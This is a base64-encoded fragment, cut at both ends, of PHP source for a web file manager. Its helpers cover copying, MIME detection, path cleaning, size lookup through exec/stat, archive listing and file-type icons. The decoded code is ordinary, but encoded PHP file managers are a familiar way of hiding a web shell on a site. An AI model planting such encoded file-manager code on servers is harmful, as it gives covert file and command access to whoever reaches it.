CAkZjIsICR1cGQpCnsKICAgICR0aW1lMSA9IGZpbGVtdGltZSgkZjEpOwogICAgaWYgKGZpbGVfZXhpc3RzKCRmMikpIHsKICAgICAgICAkdGltZTIgPSBmaWxlbXRpbWUoJGYyKTsKICAgICAgICBpZiAoJHRpbWUyID49ICR0aW1lMSAmJiAkdXBkKSB7CiAgICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICB9CiAgICB9CiAgICAkb2sgPSBjb3B5KCRmMSwgJGYyKTsKICAgIGlmICgkb2spIHsKICAgICAgICB0b3VjaCgkZjIsICR0aW1lMSk7CiAgICB9CiAgICByZXR1cm4gJG9rOwp9CgovKioKICogR2V0IG1pbWUgdHlwZQogKiBAcGFyYW0gc3RyaW5nICRmaWxlX3BhdGgKICogQHJldHVybiBtaXhlZHxzdHJpbmcKICovCmZ1bmN0aW9uIGZtX2dldF9taW1lX3R5cGUoJGZpbGVfcGF0aCkKewogICAgaWYgKGZ1bmN0aW9uX2V4aXN0cygnZmluZm9fb3BlbicpKSB7CiAgICAgICAgJGZpbmZvID0gZmluZm9fb3BlbihGSUxFSU5GT19NSU1FX1RZUEUpOwogICAgICAgICRtaW1lID0gZmluZm9fZmlsZSgkZmluZm8sICRmaWxlX3BhdGgpOwogICAgICAgIGZpbmZvX2Nsb3NlKCRmaW5mbyk7CiAgICAgICAgcmV0dXJuICRtaW1lOwogICAgfSBlbHNlaWYgKGZ1bmN0aW9uX2V4aXN0cygnbWltZV9jb250ZW50X3R5cGUnKSkgewogICAgICAgIHJldHVybiBtaW1lX2NvbnRlbnRfdHlwZSgkZmlsZV9wYXRoKTsKICAgIH0gZWxzZWlmICghc3RyaXN0cihpbmlfZ2V0KCdkaXNhYmxlX2Z1bmN0aW9ucycpLCAnc2hlbGxfZXhlYycpKSB7CiAgICAgICAgJGZpbGUgPSBlc2NhcGVzaGVsbGFyZygkZmlsZV9wYXRoKTsKICAgICAgICAkbWltZSA9IHNoZWxsX2V4ZWMoJ2ZpbGUgLWJpICcgLiAkZmlsZSk7CiAgICAgICAgcmV0dXJuICRtaW1lOwogICAgfSBlbHNlIHsKICAgICAgICByZXR1cm4gJy0tJzsKICAgIH0KfQoKLyoqCiAqIEhUVFAgUmVkaXJlY3QKICogQHBhcmFtIHN0cmluZyAkdXJsCiAqIEBwYXJhbSBpbnQgJGNvZGUKICovCmZ1bmN0aW9uIGZtX3JlZGlyZWN0KCR1cmwsICRjb2RlID0gMzAyKQp7CiAgICBoZWFkZXIoJ0xvY2F0aW9uOiAnIC4gJHVybCwgdHJ1ZSwgJGNvZGUpOwogICAgZXhpdDsKfQoKLyoqCiAqIFBhdGggdHJhdmVyc2FsIHByZXZlbnRpb24gYW5kIGNsZWFuIHRoZSB1cmwKICogSXQgcmVwbGFjZXMgKGNvbnNlY3V0aXZlKSBvY2N1cnJlbmNlcyBvZiAvIGFuZCBcXCB3aXRoIHdoYXRldmVyIGlzIGluIERJUkVDVE9SWV9TRVBBUkFUT1IsIGFuZCBwcm9jZXNzZXMgLy4gYW5kIC8uLiBmaW5lLgogKiBAcGFyYW0gJHBhdGgKICogQHJldHVybiBzdHJpbmcKICovCmZ1bmN0aW9uIGdldF9hYnNvbHV0ZV9wYXRoKCRwYXRoKSB7CiAgICAkcGF0aCA9IHN0cl9yZXBsYWNlKGFycmF5KCcvJywgJ1xcJyksIERJUkVDVE9SWV9TRVBBUkFUT1IsICRwYXRoKTsKICAgICRwYXJ0cyA9IGFycmF5X2ZpbHRlcihleHBsb2RlKERJUkVDVE9SWV9TRVBBUkFUT1IsICRwYXRoKSwgJ3N0cmxlbicpOwogICAgJGFic29sdXRlcyA9IGFycmF5KCk7CiAgICBmb3JlYWNoICgkcGFydHMgYXMgJHBhcnQpIHsKICAgICAgICBpZiAoJy4nID09ICRwYXJ0KSBjb250aW51ZTsKICAgICAgICBpZiAoJy4uJyA9PSAkcGFydCkgewogICAgICAgICAgICBhcnJheV9wb3AoJGFic29sdXRlcyk7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgJGFic29sdXRlc1tdID0gJHBhcnQ7CiAgICAgICAgfQogICAgfQogICAgcmV0dXJuIGltcGxvZGUoRElSRUNUT1JZX1NFUEFSQVRPUiwgJGFic29sdXRlcyk7Cn0KCi8qKgogKiBDbGVhbiBwYXRoCiAqIEBwYXJhbSBzdHJpbmcgJHBhdGgKICogQHJldHVybiBzdHJpbmcKICovCmZ1bmN0aW9uIGZtX2NsZWFuX3BhdGgoJHBhdGgsICR0cmltID0gdHJ1ZSkKewogICAgJHBhdGggPSAkdHJpbSA/IHRyaW0oJHBhdGgpIDogJHBhdGg7CiAgICAkcGF0aCA9IHRyaW0oJHBhdGgsICdcXC8nKTsKICAgICRwYXRoID0gc3RyX3JlcGxhY2UoYXJyYXkoJy4uLycsICcuLlxcJyksICcnLCAkcGF0aCk7CiAgICAkcGF0aCA9ICBnZXRfYWJzb2x1dGVfcGF0aCgkcGF0aCk7CiAgICBpZiAoJHBhdGggPT0gJy4uJykgewogICAgICAgICRwYXRoID0gJyc7CiAgICB9CiAgICByZXR1cm4gc3RyX3JlcGxhY2UoJ1xcJywgJy8nLCAkcGF0aCk7Cn0KCi8qKgogKiBHZXQgcGFyZW50IHBhdGgKICogQHBhcmFtIHN0cmluZyAkcGF0aAogKiBAcmV0dXJuIGJvb2x8c3RyaW5nCiAqLwpmdW5jdGlvbiBmbV9nZXRfcGFyZW50X3BhdGgoJHBhdGgpCnsKICAgICRwYXRoID0gZm1fY2xlYW5fcGF0aCgkcGF0aCk7CiAgICBpZiAoJHBhdGggIT0gJycpIHsKICAgICAgICAkYXJyYXkgPSBleHBsb2RlKCcvJywgJHBhdGgpOwogICAgICAgIGlmIChjb3VudCgkYXJyYXkpID4gMSkgewogICAgICAgICAgICAkYXJyYXkgPSBhcnJheV9zbGljZSgkYXJyYXksIDAsIC0xKTsKICAgICAgICAgICAgcmV0dXJuIGltcGxvZGUoJy8nLCAkYXJyYXkpOwogICAgICAgIH0KICAgICAgICByZXR1cm4gJyc7CiAgICB9CiAgICByZXR1cm4gZmFsc2U7Cn0KCi8qKgogKiBDaGVjayBmaWxlIGlzIGluIGV4Y2x1ZGUgbGlzdAogKiBAcGFyYW0gc3RyaW5nICRmaWxlCiAqIEByZXR1cm4gYm9vbAogKi8KZnVuY3Rpb24gZm1faXNfZXhjbHVkZV9pdGVtcygkZmlsZSkgewogICAgJGV4dCA9IHN0cnRvbG93ZXIocGF0aGluZm8oJGZpbGUsIFBBVEhJTkZPX0VYVEVOU0lPTikpOwogICAgaWYoIWluX2FycmF5KCRmaWxlLCBGTV9FWENMVURFX0lURU1TKSAmJiAhaW5fYXJyYXkoIiouJGV4dCIsIEZNX0VYQ0xVREVfSVRFTVMpKSB7CiAgICAgICAgcmV0dXJuIHRydWU7CiAgICB9CiAgICByZXR1cm4gZmFsc2U7Cn0KCi8qKgogKiBnZXQgbGFuZ3VhZ2UgdHJhbnNsYXRpb25zIGZyb20ganNvbiBmaWxlCiAqIEBwYXJhbSBpbnQgJHRyCiAqIEByZXR1cm4gYXJyYXkKICovCmZ1bmN0aW9uIGZtX2dldF90cmFuc2xhdGlvbnMoJHRyKSB7CiAgICB0cnkgewogICAgICAgICRjb250ZW50ID0gQGZpbGVfZ2V0X2NvbnRlbnRzKCd0cmFuc2xhdGlvbi5qc29uJyk7CiAgICAgICAgaWYoJGNvbnRlbnQgIT09IEZBTFNFKSB7CiAgICAgICAgICAgICRsbmcgPSBqc29uX2RlY29kZSgkY29udGVudCwgVFJVRSk7CiAgICAgICAgICAgIGdsb2JhbCAkbGFuZ19saXN0OwogICAgICAgICAgICBmb3JlYWNoICgkbG5nWyJsYW5ndWFnZSJdIGFzICRrZXkgPT4gJHZhbHVlKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkY29kZSA9ICR2YWx1ZVsiY29kZSJdOwogICAgICAgICAgICAgICAgJGxhbmdfbGlzdFskY29kZV0gPSAkdmFsdWVbIm5hbWUiXTsKICAgICAgICAgICAgICAgIGlmICgkdHIpCiAgICAgICAgICAgICAgICAgICAgJHRyWyRjb2RlXSA9ICR2YWx1ZVsidHJhbnNsYXRpb24iXTsKICAgICAgICAgICAgfQogICAgICAgICAgICByZXR1cm4gJHRyOwogICAgICAgIH0KCiAgICB9CiAgICBjYXRjaCAoRXhjZXB0aW9uICRlKSB7CiAgICAgICAgZWNobyAkZTsKICAgIH0KfQoKLyoqCiAqIEBwYXJhbSAkZmlsZQogKiBSZWNvdmVyIGFsbCBmaWxlIHNpemVzIGxhcmdlciB0aGFuID4gMkdCLgogKiBXb3JrcyBvbiBwaHAgMzJiaXRzIGFuZCA2NGJpdHMgYW5kIHN1cHBvcnRzIGxpbnV4CiAqIEByZXR1cm4gaW50fHN0cmluZwogKi8KZnVuY3Rpb24gZm1fZ2V0X3NpemUoJGZpbGUpCnsKICAgIHN0YXRpYyAkaXN3aW47CiAgICBzdGF0aWMgJGlzZGFyd2luOwogICAgaWYgKCFpc3NldCgkaXN3aW4pKSB7CiAgICAgICAgJGlzd2luID0gKHN0cnRvdXBwZXIoc3Vic3RyKFBIUF9PUywgMCwgMykpID09ICdXSU4nKTsKICAgIH0gCiAgICBpZiAoIWlzc2V0KCRpc2RhcndpbikpIHsKICAgICAgICAkaXNkYXJ3aW4gPSAoc3RydG91cHBlcihzdWJzdHIoUEhQX09TLCAwKSkgPT0gIkRBUldJTiIpOwogICAgfQoKICAgIHN0YXRpYyAkZXhlY193b3JrczsKICAgIGlmICghaXNzZXQoJGV4ZWNfd29ya3MpKSB7CiAgICAgICAgJGV4ZWNfd29ya3MgPSAoZnVuY3Rpb25fZXhpc3RzKCdleGVjJykgJiYgIWluaV9nZXQoJ3NhZmVfbW9kZScpICYmIEBleGVjKCdlY2hvIEVYRUMnKSA9PSAnRVhFQycpOwogICAgfQoKICAgIC8vIHRyeSBhIHNoZWxsIGNvbW1hbmQKICAgIGlmICgkZXhlY193b3JrcykgewogICAgICAgICRhcmcgPSBlc2NhcGVzaGVsbGFyZygkZmlsZSk7CiAgICAgICAgJGNtZCA9ICgkaXN3aW4pID8gImZvciAlRiBpbiAoXCIkZmlsZVwiKSBkbyBAZWNobyAlfnpGIiA6ICgkaXNkYXJ3aW4gPyAic3RhdCAtZiV6ICRhcmciIDogInN0YXQgLWMlcyAkYXJnIik7CiAgICAgICAgQGV4ZWMoJGNtZCwgJG91dHB1dCk7CiAgICAgICAgaWYgKGlzX2FycmF5KCRvdXRwdXQpICYmIGN0eXBlX2RpZ2l0KCRzaXplID0gdHJpbShpbXBsb2RlKCJcbiIsICRvdXRwdXQpKSkpIHsKICAgICAgICAgICAgcmV0dXJuICRzaXplOwogICAgICAgIH0KICAgIH0KCiAgICAvLyB0cnkgdGhlIFdpbmRvd3MgQ09NIGludGVyZmFjZQogICAgaWYgKCRpc3dpbiAmJiBjbGFzc19leGlzdHMoIkNPTSIpKSB7CiAgICAgICAgdHJ5IHsKICAgICAgICAgICAgJGZzb2JqID0gbmV3IENPTSgnU2NyaXB0aW5nLkZpbGVTeXN0ZW1PYmplY3QnKTsKICAgICAgICAgICAgJGYgPSAkZnNvYmotPkdldEZpbGUoIHJlYWxwYXRoKCRmaWxlKSApOwogICAgICAgICAgICAkc2l6ZSA9ICRmLT5TaXplOwogICAgICAgIH0gY2F0Y2ggKEV4Y2VwdGlvbiAkZSkgewogICAgICAgICAgICAkc2l6ZSA9IG51bGw7CiAgICAgICAgfQogICAgICAgIGlmIChjdHlwZV9kaWdpdCgkc2l6ZSkpIHsKICAgICAgICAgICAgcmV0dXJuICRzaXplOwogICAgICAgIH0KICAgIH0KCiAgICAvLyBpZiBhbGwgZWxzZSBmYWlscwogICAgcmV0dXJuIGZpbGVzaXplKCRmaWxlKTsKfQoKLyoqCiAqIEdldCBuaWNlIGZpbGVzaXplCiAqIEBwYXJhbSBpbnQgJHNpemUKICogQHJldHVybiBzdHJpbmcKICovCmZ1bmN0aW9uIGZtX2dldF9maWxlc2l6ZSgkc2l6ZSkKewogICAgJHNpemUgPSAoZmxvYXQpICRzaXplOwogICAgJHVuaXRzID0gYXJyYXkoJ0InLCAnS0InLCAnTUInLCAnR0InLCAnVEInLCAnUEInLCAnRUInLCAnWkInLCAnWUInKTsKICAgICRwb3dlciA9ICRzaXplID4gMCA/IGZsb29yKGxvZygkc2l6ZSwgMTAyNCkpIDogMDsKICAgIHJldHVybiBzcHJpbnRmKCclcyAlcycsIHJvdW5kKCRzaXplIC8gcG93KDEwMjQsICRwb3dlciksIDIpLCAkdW5pdHNbJHBvd2VyXSk7Cn0KCi8qKgogKiBHZXQgZGlyZWN0b3IgdG90YWwgc2l6ZQogKiBAcGFyYW0gc3RyaW5nICRkaXJlY3RvcnkKICogQHJldHVybiBpbnQKICovCmZ1bmN0aW9uIGZtX2dldF9kaXJlY3RvcnlzaXplKCRkaXJlY3RvcnkpIHsKICAgIGdsb2JhbCAkY2FsY19mb2xkZXI7CiAgICBpZiAoJGNhbGNfZm9sZGVyPT10cnVlKSB7IC8vICBTbG93ZXIgb3V0cHV0CiAgICAgICRzaXplID0gMDsgICRjb3VudD0gMDsgICRkaXJDb3VudD0gMDsKICAgIGZvcmVhY2gobmV3IFJlY3Vyc2l2ZUl0ZXJhdG9ySXRlcmF0b3IobmV3IFJlY3Vyc2l2ZURpcmVjdG9yeUl0ZXJhdG9yKCRkaXJlY3RvcnkpKSBhcyAkZmlsZSkKICAgIGlmICgkZmlsZS0+aXNGaWxlKCkpCiAgICAgICAgeyAgICRzaXplKz0kZmlsZS0+Z2V0U2l6ZSgpOwogICAgICAgICAgICAkY291bnQrKzsKICAgICAgICB9CiAgICBlbHNlIGlmICgkZmlsZS0+aXNEaXIoKSkgeyAkZGlyQ291bnQrKzsgfQogICAgLy8gcmV0dXJuIFskc2l6ZSwgJGNvdW50LCAkZGlyQ291bnRdOwogICAgcmV0dXJuICRzaXplOwogICAgfQogICAgZWxzZSByZXR1cm4gJ0ZvbGRlcic7IC8vICBRdWljayBvdXRwdXQKfQoKLyoqCiAqIEdldCBpbmZvIGFib3V0IHppcCBhcmNoaXZlCiAqIEBwYXJhbSBzdHJpbmcgJHBhdGgKICogQHJldHVybiBhcnJheXxib29sCiAqLwpmdW5jdGlvbiBmbV9nZXRfemlmX2luZm8oJHBhdGgsICRleHQpIHsKICAgIGlmICgkZXh0ID09ICd6aXAnICYmIGZ1bmN0aW9uX2V4aXN0cygnemlwX29wZW4nKSkgewogICAgICAgICRhcmNoID0gemlwX29wZW4oJHBhdGgpOwogICAgICAgIGlmICgkYXJjaCkgewogICAgICAgICAgICAkZmlsZW5hbWVzID0gYXJyYXkoKTsKICAgICAgICAgICAgd2hpbGUgKCR6aXBfZW50cnkgPSB6aXBfcmVhZCgkYXJjaCkpIHsKICAgICAgICAgICAgICAgICR6aXBfbmFtZSA9IHppcF9lbnRyeV9uYW1lKCR6aXBfZW50cnkpOwogICAgICAgICAgICAgICAgJHppcF9mb2xkZXIgPSBzdWJzdHIoJHppcF9uYW1lLCAtMSkgPT0gJy8nOwogICAgICAgICAgICAgICAgJGZpbGVuYW1lc1tdID0gYXJyYXkoCiAgICAgICAgICAgICAgICAgICAgJ25hbWUnID0+ICR6aXBfbmFtZSwKICAgICAgICAgICAgICAgICAgICAnZmlsZXNpemUnID0+IHppcF9lbnRyeV9maWxlc2l6ZSgkemlwX2VudHJ5KSwKICAgICAgICAgICAgICAgICAgICAnY29tcHJlc3NlZF9zaXplJyA9PiB6aXBfZW50cnlfY29tcHJlc3NlZHNpemUoJHppcF9lbnRyeSksCiAgICAgICAgICAgICAgICAgICAgJ2ZvbGRlcicgPT4gJHppcF9mb2xkZXIKICAgICAgICAgICAgICAgICAgICAvLydjb21wcmVzc2lvbl9tZXRob2QnID0+IHppcF9lbnRyeV9jb21wcmVzc2lvbm1ldGhvZCgkemlwX2VudHJ5KSwKICAgICAgICAgICAgICAgICk7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgemlwX2Nsb3NlKCRhcmNoKTsKICAgICAgICAgICAgcmV0dXJuICRmaWxlbmFtZXM7CiAgICAgICAgfQogICAgfSBlbHNlaWYoJGV4dCA9PSAndGFyJyAmJiBjbGFzc19leGlzdHMoJ1BoYXJEYXRhJykpIHsKICAgICAgICAkYXJjaGl2ZSA9IG5ldyBQaGFyRGF0YSgkcGF0aCk7CiAgICAgICAgJGZpbGVuYW1lcyA9IGFycmF5KCk7CiAgICAgICAgZm9yZWFjaChuZXcgUmVjdXJzaXZlSXRlcmF0b3JJdGVyYXRvcigkYXJjaGl2ZSkgYXMgJGZpbGUpIHsKICAgICAgICAgICAgJHBhcmVudF9pbmZvID0gJGZpbGUtPmdldFBhdGhJbmZvKCk7CiAgICAgICAgICAgICR6aXBfbmFtZSA9IHN0cl9yZXBsYWNlKCJwaGFyOi8vIi4kcGF0aCwgJycsICRmaWxlLT5nZXRQYXRoTmFtZSgpKTsKICAgICAgICAgICAgJHppcF9uYW1lID0gc3Vic3RyKCR6aXBfbmFtZSwgKCRwb3MgPSBzdHJwb3MoJHppcF9uYW1lLCAnLycpKSAhPT0gZmFsc2UgPyAkcG9zICsgMSA6IDApOwogICAgICAgICAgICAkemlwX2ZvbGRlciA9ICRwYXJlbnRfaW5mby0+Z2V0RmlsZU5hbWUoKTsKICAgICAgICAgICAgJHppcF9pbmZvID0gbmV3IFNwbEZpbGVJbmZvKCRmaWxlKTsKICAgICAgICAgICAgJGZpbGVuYW1lc1tdID0gYXJyYXkoCiAgICAgICAgICAgICAgICAnbmFtZScgPT4gJHppcF9uYW1lLAogICAgICAgICAgICAgICAgJ2ZpbGVzaXplJyA9PiAkemlwX2luZm8tPmdldFNpemUoKSwKICAgICAgICAgICAgICAgICdjb21wcmVzc2VkX3NpemUnID0+ICRmaWxlLT5nZXRDb21wcmVzc2VkU2l6ZSgpLAogICAgICAgICAgICAgICAgJ2ZvbGRlcicgPT4gJHppcF9mb2xkZXIKICAgICAgICAgICAgKTsKICAgICAgICB9CiAgICAgICAgcmV0dXJuICRmaWxlbmFtZXM7CiAgICB9CiAgICByZXR1cm4gZmFsc2U7Cn0KCi8qKgogKiBFbmNvZGUgaHRtbCBlbnRpdGllcwogKiBAcGFyYW0gc3RyaW5nICR0ZXh0CiAqIEByZXR1cm4gc3RyaW5nCiAqLwpmdW5jdGlvbiBmbV9lbmMoJHRleHQpCnsKICAgIHJldHVybiBodG1sc3BlY2lhbGNoYXJzKCR0ZXh0LCBFTlRfUVVPVEVTLCAnVVRGLTgnKTsKfQoKLyoqCiAqIFByZXZlbnQgWFNTIGF0dGFja3MKICogQHBhcmFtIHN0cmluZyAkdGV4dAogKiBAcmV0dXJuIHN0cmluZwogKi8KZnVuY3Rpb24gZm1faXN2YWxpZF9maWxlbmFtZSgkdGV4dCkgewogICAgcmV0dXJuIChzdHJwYnJrKCR0ZXh0LCAnLz8lKjp8Ijw+JykgPT09IEZBTFNFKSA/IHRydWUgOiBmYWxzZTsKfQoKLyoqCiAqIFNhdmUgbWVzc2FnZSBpbiBzZXNzaW9uCiAqIEBwYXJhbSBzdHJpbmcgJG1zZwogKiBAcGFyYW0gc3RyaW5nICRzdGF0dXMKICovCmZ1bmN0aW9uIGZtX3NldF9tc2coJG1zZywgJHN0YXR1cyA9ICdvaycpCnsKICAgICRfU0VTU0lPTltGTV9TRVNTSU9OX0lEXVsnbWVzc2FnZSddID0gJG1zZzsKICAgICRfU0VTU0lPTltGTV9TRVNTSU9OX0lEXVsnc3RhdHVzJ10gPSAkc3RhdHVzOwp9CgovKioKICogQ2hlY2sgaWYgc3RyaW5nIGlzIGluIFVURi04CiAqIEBwYXJhbSBzdHJpbmcgJHN0cmluZwogKiBAcmV0dXJuIGludAogKi8KZnVuY3Rpb24gZm1faXNfdXRmOCgkc3RyaW5nKQp7CiAgICByZXR1cm4gcHJlZ19tYXRjaCgnLy91JywgJHN0cmluZyk7Cn0KCi8qKgogKiBDb252ZXJ0IGZpbGUgbmFtZSB0byBVVEYtOCBpbiBXaW5kb3dzCiAqIEBwYXJhbSBzdHJpbmcgJGZpbGVuYW1lCiAqIEByZXR1cm4gc3RyaW5nCiAqLwpmdW5jdGlvbiBmbV9jb252ZXJ0X3dpbigkZmlsZW5hbWUpCnsKICAgIGlmIChGTV9JU19XSU4gJiYgZnVuY3Rpb25fZXhpc3RzKCdpY29udicpKSB7CiAgICAgICAgJGZpbGVuYW1lID0gaWNvbnYoRk1fSUNPTlZfSU5QVVRfRU5DLCAnVVRGLTgvL0lHTk9SRScsICRmaWxlbmFtZSk7CiAgICB9CiAgICByZXR1cm4gJGZpbGVuYW1lOwp9CgovKioKICogQHBhcmFtICRvYmoKICogQHJldHVybiBhcnJheQogKi8KZnVuY3Rpb24gZm1fb2JqZWN0X3RvX2FycmF5KCRvYmopCnsKICAgIGlmICghaXNfb2JqZWN0KCRvYmopICYmICFpc19hcnJheSgkb2JqKSkgewogICAgICAgIHJldHVybiAkb2JqOwogICAgfQogICAgaWYgKGlzX29iamVjdCgkb2JqKSkgewogICAgICAgICRvYmogPSBnZXRfb2JqZWN0X3ZhcnMoJG9iaik7CiAgICB9CiAgICByZXR1cm4gYXJyYXlfbWFwKCdmbV9vYmplY3RfdG9fYXJyYXknLCAkb2JqKTsKfQoKLyoqCiAqIEdldCBDU1MgY2xhc3NuYW1lIGZvciBmaWxlCiAqIEBwYXJhbSBzdHJpbmcgJHBhdGgKICogQHJldHVybiBzdHJpbmcKICovCmZ1bmN0aW9uIGZtX2dldF9maWxlX2ljb25fY2xhc3MoJHBhdGgpCnsKICAgIC8vIGdldCBleHRlbnNpb24KICAgICRleHQgPSBzdHJ0b2xvd2VyKHBhdGhpbmZvKCRwYXRoLCBQQVRISU5GT19FWFRFTlNJT04pKTsKCiAgICBzd2l0Y2ggKCRleHQpIHsKICAgICAgICBjYXNlICdpY28nOgogICAgICAgIGNhc2UgJ2dpZic6CiAgICAgICAgY2FzZSAnanBnJzoKICAgICAgICBjYXNlICdqcGVnJzoKICAgICAgICBjYXNlICdqcGMnOgogICAgICAgIGNhc2UgJ2pwMic6CiAgICAgICAgY2FzZSAnanB4JzoKICAgICAgICBjYXNlICd4Ym0nOgogICAgICAgIGNhc2UgJ3dibXAnOgogICAgICAgIGNhc2UgJ3BuZyc6CiAgICAgICAgY2FzZSAnYm1wJzoKICAgICAgICBjYXNlICd0aWYnOgogICAgICAgIGNhc2UgJ3RpZmYnOgogICAgICAgIGNhc2UgJ3N2Zyc6CiAgICAgICAgICAgICRpbWcgPSAnZmEgZmEtcGljdHVyZS1vJzsKICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgY2FzZSAncGFzc3dkJzoKICAgICAgICBjYXNlICdmdHBxdW90YSc6CiAgICAgICAgY2FzZSAnc3FsJzoKICAgICAgICBjYXNlICdqcyc6CiAgICAgICAgY2FzZSAnanNvbic6CiAgICAgICAgY2FzZSAnc2gnOgogICAgICAgIGNhc2UgJ2NvbmZpZyc6CiAgICAgICAgY2FzZSAndHdpZyc6CiAgICAgICAgY2FzZSAndHBsJzoKICAgICAgICBjYXNlICdtZCc6CiAgICAgICAgY2FzZSAnZ2l0aWdub3JlJzoKICAgICAgICBjYXNlICdjJzoKICAgICAgICBjYXNlICdjcHAnOgogICAgICAgIGNhc2UgJ2NzJzoKICAgICAgICBjYXNlICdweSc6CiAgICAgICAgY2FzZSAnbWFwJzoKICAgICAgICBjYXNlICdsb2NrJzoKICAgICAgICBjYXNlICdkdGQnOgogICAgICAgICAgICAkaW1nID0gJ2ZhIGZhLWZpbGUtY29kZS1vJzsKICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgY2FzZSAndHh0JzoKICAgICAgICBjYXNlICdpbmknOgogICAgICAgIGNhc2UgJ2NvbmYnOgogICAgICAgIGNhc2UgJ2xvZyc6CiAgICAgICAgY2FzZSAnaHRhY2Nlc3MnOgogICAgICAgICAgICAkaW1nID0gJ2ZhIGZhLWZpbGUtdGV4dC1vJzsKICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgY2FzZSAnY3NzJzoKICAgICAgICBjYXNlICdsZXNzJzoKICAgICAgICBjYXNlICdzYXNzJzoKICAgICAgICBjYXNlICdzY3NzJzoKICAgICAgICAgICAgJGltZyA9ICdmYSBmYS1jc3MzJzsKICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgY2FzZSAnemlwJzoKICAgICAgICBjYXNlICdyYXInOgogICAgICAgIGNhc2UgJ2d6JzoKICAgICAgICBjYXNlICd0YXInOgogICAgICAgIGNhc2UgJzd6JzoKICAgICAgICAgICAgJGltZyA9ICdmYSBmYS1maWxlLWFyY2hpdmUtbyc7CiAgICAgICAgICAgIGJyZWFrOwogICAgICAgIGNhc2UgJ3BocCc6CiAgICAgICAgY2FzZSAncGhwNCc6CiAgICAgICAgY2FzZSAncGhwNSc6CiAgICAgICAgY2FzZSAncGhwcyc6CiAgICAgICAgY2FzZSAncGh0bWwnOgogICAgICAgICAgICAkaW1nID0gJ2ZhIGZhLWNvZGUnOwogICAgICAgICAgICBicmVhazsKICAgICAgICBjYXNlICdodG0nOgogICAgICAgIGNhc2UgJ2h0bWwnOgogICAgICAgIGNhc2UgJ3NodG1sJzoKICAgICAgICBjYXNlICd4aHRtbCc6CiAgICAgICAgICAgICRpbWcgPSAnZmEgZmEtaHRtbDUnOwogICAgICAgICAgICBicmVhazsKICAgICAgICBjYXNlICd4bWwnOgogICAgICAgIGNhc2UgJ3hzbCc6CiAgICAgICAgICAgICRpbWcgPSAnZmEgZmEtZmlsZS1leGNlbC1vJzsKICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgY2FzZSAnd2F2JzoKICAgICAgICBjYXNlICdtcDMnOgogICAgICAgIGNhc2UgJ21wMic6CiAgICAgICAgY2FzZSAnbTRhJzoKICAgICAgICBjYXNlICdhYWMnOgogICAgICAgIGNhc2UgJ29nZyc6CiAgICAgICAgY2FzZSAnb2dhJzoKICAgICAgICBjYXNlICd3bWEnOgogICAgICAgIGNhc2UgJ21rYSc6CiAgICAgICAgY2FzZSAnZmxhYyc6CiAgICAgICAgY2FzZSAnYWMzJzoKICAgICAgICBjYXNlICd0ZHMnOgogICAgICAgICAgICAkaW1nID0gJ2ZhIGZhLW11c2ljJzsKICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgY2FzZSAnbTN1JzoKICAgICAgICBjYXNlICdtM3U4JzoKICAgICAgICBjYXNlICdwbHMnOgogICAgICAgIGNhc2UgJ2N1ZSc6CiAgICAgICAgICAgICRpbWcgPSAnZmEgZmEtaGVhZHBob25lcyc7CiAgICAgICAgICAgIGJyZWFrOwogICAgICAgIGNhc2UgJ2F2aSc6CiAgICAgICAgY2FzZSAnbXBnJzoKICAgICAgICBjYXNlICdtcGVnJzoKICAgICAgICBjYXNlICdtcDQnOgogICAgICAgIGNhc2UgJ200dic6CiAgICAgICAgY2FzZSAnZmx2JzoKICAgICAgICBjYXNlICdmNHYnOgogICAgICAgIGNhc2UgJ29nbSc6CiAgICAgICAgY2FzZSAnb2d2JzoKICAgICAgICBjYXNlICdtb3YnOgogICAgICAgIGNhc2UgJ21rdic6CiAgICAgICAgY2FzZSAnM2dwJzoKICAgICAgICBjYXNlICdhc2YnOgogICAgICAgIGNhc2UgJ3dtdic6CiAgICAgICAgICAgICRpbWcgPSAnZmEgZmEtZmlsZS12aWRlby1vJzsKICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgY2FzZSAnZW1sJzoKICAgICAgICBjYXNlICdtc2cnOgogICAgICAgICAgICAkaW1nID0gJ2ZhIGZhLWVudmVsb3BlLW8nOwogICAgICAgICAgICBicmVhazsKICAgICAgICBjYXNlICd4bHMnOgogICAgICAgIGNhc2UgJ3hsc3gnOgogICAgICAgIGNhc2UgJ29kcyc6CiAgICAgICAgICAgICRpbWcgPSAnZmEgZmEtZmlsZS1leGNlbC1vJzsKICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgY2FzZSAnY3N2JzoKICAgICAgICAgICAgJGltZyA9ICdmYSBmYS1maWxlLXRleHQtbyc7CiAgICAgICAgICAgIGJyZWFrOwogICAgICAgIGNhc2UgJ2Jhayc6CiAgICAgICAgICAgICRpbWcgPSAnZmEgZmEtY2xpcGJvYXJkJzsKICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgY2FzZSAnZG9jJzoKICAgICAgICBjYXNlICdkb2N4JzoKICAgICAgICBjYXNlICdvZHQnOgogICAgICAgICAgICAkaW1nID0gJ2ZhIGZhLWZpbGUtd29yZC1vJzsKICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgY2FzZSAncHB0JzoKICAgICAgICBjYXNlICdwcHR4JzoKICAgICAgICAgICAgJGltZyA9ICdmYSBmYS1maWxlLXBvd2VycG9pbnQtbyc7CiAgICAgICAgICAgIGJyZWFrOwogICAgICAgIGNhc2UgJ3R0Zic6CiAgICAgICAgY2FzZSAndHRjJzoKICAgICAgICBjYXNlICdvdGYnOgogICAgICAgIGNhc2UgJ3dvZmYnOgogICAgICAgIGNhc2UgJ3dvZmYyJzoKICAgICAgICBjYXNlICdlb3QnOgogICAgICAgIGNhc2UgJ2Zvbic6CiAgICAgICAgICAgICRpbWcgPSAnZmEgZmEtZm9udCc7CiAgICAgICAgICAgIGJyZWFrOwogICAgICAgIGNhc2UgJ3BkZic6CiAgICAgICAgICAgICRpbWcgPSAnZmEgZmEtZmlsZS1wZGYtbyc7CiAgICAgICAgICAgIGJyZWFrOwogICAgICAgIGNhc2UgJ3BzZCc6CiAgICAgICAgY2FzZSAnYWknOgogICAgICAgIGNhc2UgJ2Vwcyc6CiAgICAgICAgY2FzZSAnZmxhJzoKI